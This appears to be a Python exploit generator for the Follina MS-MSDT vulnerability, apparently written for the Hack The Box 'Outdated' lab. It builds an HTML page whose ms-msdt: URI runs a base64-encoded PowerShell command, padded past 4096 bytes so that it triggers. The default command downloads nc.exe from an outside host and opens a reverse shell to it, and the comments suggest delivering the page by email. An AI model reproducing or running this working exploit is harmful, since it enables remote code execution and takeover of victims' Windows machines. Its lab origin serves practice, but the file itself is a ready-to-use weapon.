#!/usr/bin/env python3
# Usage <python3 exploit.py> this will generate an html payload
# Save the payload as msdt.html 
# Use the payload with swaks terminal email or follow 0xdf guide on HTB Outdated
import base64
import random
import string
import sys

if len(sys.argv) > 1:
    command = sys.argv[1]
else:
    command = "IWR http://10.10.14.3/nc.exe -outfile C:\\programdata\\nc.exe; C:\\programdata\\nc.exe 10.10.14.3 443 -e cmd"

base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")

# Slap together a unique MS-MSDT payload that is over 4096 bytes at minimum
html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
html_payload += (
    "".join([random.choice(string.ascii_lowercase) for _ in range(4096)])
    + "\n</script>"
)

print(html_payload)

